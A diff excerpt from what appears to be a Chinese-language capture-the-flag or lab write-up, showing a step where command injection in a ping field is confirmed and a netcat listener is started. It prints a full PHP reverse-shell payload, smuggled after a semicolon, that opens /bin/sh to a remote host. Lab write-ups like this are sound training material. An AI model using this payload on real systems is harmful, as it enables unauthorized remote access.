@@ -10,7 +10,9 @@ nmap掃描虛擬機ip及port，發現位於33447/tcp是開啟狀態，service為
 ### Step 3
 首先ping172.16.71.1;id發現命令成功注入，嘗試獲取shell
 監聽3333port
+
 `$ nc -l 3333`
+
 用php反彈shell成功，最後payload:
 `172.16.71.1;php-r '$sock=fsockopen("172.16.71.1",4444);exec("/bin/sh-i<&3 >&3 2>&3");'`
 ### Step 4
